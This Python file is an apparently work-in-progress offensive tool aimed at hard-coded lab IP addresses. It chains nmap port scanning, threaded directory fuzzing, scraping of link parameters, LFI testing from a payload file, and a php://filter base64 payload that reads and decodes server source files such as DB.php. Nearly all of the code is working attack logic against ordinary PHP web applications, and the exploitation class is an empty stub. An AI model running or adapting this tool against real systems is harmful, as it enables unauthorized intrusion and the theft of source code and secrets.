import nmap3
import pandas as pd
from bs4 import BeautifulSoup
import requests
from sys import argv
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from colorama import Fore, Style, init
import time
import base64

ip_1 = "10.10.143.101"
ip_2 = "10.10.143.102"
credentials = []
services = []
run_in_background = []
found_web_directories = []
links = []
lfi_results = []
lfi_candidates = []

class Scanner:
    def __init__(self, ip):
        self.ip = ip
        self.nmap = nmap3.NmapScanTechniques() # initiate Nmap

    def scan_all_ports(self):
        ip = self.ip
        global services
        scan_data = self.nmap.nmap_tcp_scan(ip, '-p- --min-rate=1500') # this returns a dict of the nmap results
        open_ports = [port for port in scan_data[ip]['ports'] if port['state'] == 'open'] # condition to only pass through open ports
        df = pd.json_normalize(open_ports) # formats the open ports as a table, turning the list of open port dictionaries into a DataFrame
        # iterating over the DataFrames rows to find services, and append the ip, port, and service to the global var 'services'
        for _, row in df.iterrows():
            service = row['service.name']
            port = row['portid']
            services.append({'ip': ip, 'port': port, 'service': service})
        print(df)
        print(services)

class WebFuzzing:
    """
    A class for performing web fuzzing to discover accessible directories on a target web server.
    Attributes:
        ip (str): The IP address of the target server.
        thread_count (int): The number of threads to use for concurrent requests.
    Methods:
        check_directory(url):
            Sends a HEAD request to the specified URL and prints it if the response status code indicates the directory exists or is accessible (200, 301, 403).
        httpx_fuzzing():
            Determines the base URL based on detected HTTP/HTTPS services, reads a wordlist of directory names, and concurrently checks each directory using threads.
    """
    def __init__(self, ip, thread_count):
        self.ip = ip
        self.thread_count = thread_count
        self.stop_fuzzing = False

    def check_directory(self, url):
        # Sends a HEAD request to check if the directory exists or is accessible
        try:
            response = httpx.head(url, verify=False, timeout=3)
            if response.status_code in [200, 301, 403]:
                print(f"Found URL ({response.status_code}): {url}")
        except Exception:
            pass

    def httpx_fuzzing(self):
        # Directory fuzzing using httpx and threads. User can interrupt to move to next phase.
        if any(entry['port'] == '80' and entry['service'] == 'http' for entry in services):
            base_url = f"http://{self.ip}/"
        elif any(entry['port'] == '443' and entry['service'] == 'https' for entry in services):
            base_url = f"https://{self.ip}/"
        else:
            print("No HTTP/S detected")
            return

        wordlist = "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

        # Start a background thread to listen for user input to break fuzzing
        def wait_for_user():
            input("Press Enter at any time to proceed to the next phase...\n")
            self.stop_fuzzing = True

        threading.Thread(target=wait_for_user, daemon=True).start()
        try:
            with open(wordlist, 'r') as f:
                dirs = [line.strip() for line in f]
            # ThreadPoolExecutor for concurrent directory checks
            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                for dirs_name in dirs:
                    if self.stop_fuzzing:
                        print("Proceeding to locating possible LFI's in found web pages")
                        break
                    url = base_url + dirs_name
                    executor.submit(self.check_directory, url)
                    time.sleep(0.01)  # Small delay for responsiveness
                # After user interrupts, shutdown threads and move to LFI phase
                if self.stop_fuzzing:
                    executor.shutdown(wait=True)
                    self.locate_lfi('/dev') # testing, need to add ability to iterate through found webpages
        except FileNotFoundError:
            print(f"wordlist '{wordlist}' not found")

    def locate_lfi(self, web_page):
        # Scrape links from the given web page and identify possible LFI parameters
        response = requests.get(f"http://{self.ip}/{web_page}")
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all("a")

        hrefs = []
        for link in links:
            href = link.get("href")
            if href not in hrefs:
                hrefs.append(str(href))
        hrefs_df = pd.DataFrame({'Links': hrefs})
        print(Fore.GREEN + f"Links scraped of web page: {web_page}" + Style.RESET_ALL)
        print(hrefs_df)

        print(Fore.YELLOW + "Possible LFI Vulnerability" + Style.RESET_ALL)
        possible_lfi = set()
        for href in hrefs:
            if href and "?" in href:
                # Extract parameter name from href
                param = href.split("?")[1].split("=")[0]
                base_url = href.split("=")[0]
                full_url = f"http://{self.ip}{web_page}/{base_url}"
                lfi_candidates.append({'url': full_url, 'href': href, 'Possible vulnerable parameter': param})
        lfi_df = pd.DataFrame(lfi_candidates)
        print(lfi_df)

    def test_lfi(self, payload_file):
        # Test each LFI candidate with payloads from the file
        negative = ['Failed opening']
        seen = set()
        with open(payload_file, 'r') as f:
            for payload in f:
                payload = payload.strip()
                for candidate in lfi_candidates:
                    url = candidate['url']
                    param = candidate['Possible vulnerable parameter']
                    key = (url, param, payload)
                    if key in seen:
                        continue  # Skip duplicate tests
                    seen.add(key)
                    response = requests.get(url, params={param: payload})
                    print(Fore.YELLOW + f"Testing For LFI vulnerability: {url}?{param}={payload}" + Style.RESET_ALL)
                    # If negative string found, skip storing result
                    if any(neg in response.text for neg in negative):
                        continue
                    # Extract LFI content from <p> tags
                    soup = BeautifulSoup(response.text, 'html.parser')
                    lfi_content = '\n'.join([tag.get_text() for tag in soup.find_all('p')])
                    if lfi_content:
                        lfi_results.append({
                            "Url": f"{url}?{param}={payload}",
                            "Content": lfi_content,
                            "Is Vulnerable": "Most Likely Vulnerable"
                        })
        # Display results in a DataFrame for easy review
        lfi_results_df = pd.DataFrame(lfi_results)
        print(lfi_results_df)

    def test_php_filter(self, payload):
        base64_content = {
            "Encoded": '',
            "Decoded": ''
        }
        php_filters = {
            "Filter and b64": "php://filter/convert.base64-encode/resource"
        }
        for candidate in lfi_candidates:
            url = candidate["url"]
            #testing url
            #url = 'http://127.0.0.1/dev'
            param = candidate["Possible vulnerable parameter"]
            response = requests.get(url=url, params={param: f"{php_filters['Filter and b64']}={payload}"})
            #try and extract base64 encoded content from the response
            soupy_goodness = BeautifulSoup(response.text, 'html.parser')
            # extract text from all <p> tags
            for p_tag in soupy_goodness.find_all('p'):
                text = p_tag.get_text().strip().replace('\n', '').replace('\r', '')
                if len(text) > 100 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in text):
                    print("Base64 output detected (truncated):", text[:100])
                    try:
                        decoded = base64.b64decode(text).decode(errors='replace')
                    except Exception as e:
                        decoded = f"Decoding error: {e}"
                    print(f"Decoded Base64 String (truncated): {decoded[:100]}")
                    base64_content["Encoded"] = text
                    base64_content["Decoded"] = decoded
            

class WebExploitation:
    def __init__(self, ip):
        self.ip = ip

    # exploiting PHP filter
            

        

        
                    

        

    

if __name__ == "__main__":
    #scanner = Scanner(ip=ip_2)
    #scanner.scan_all_ports()
    #web_actions = WebFuzzing(ip_2, 10)
    #web_actions.httpx_fuzzing()
    test_lfi = WebFuzzing(ip_2, 1)
    test_lfi.locate_lfi('/dev')
    test_lfi.test_lfi('./lfi_payload')
    test_lfi.test_php_filter('DB.php')
    

    


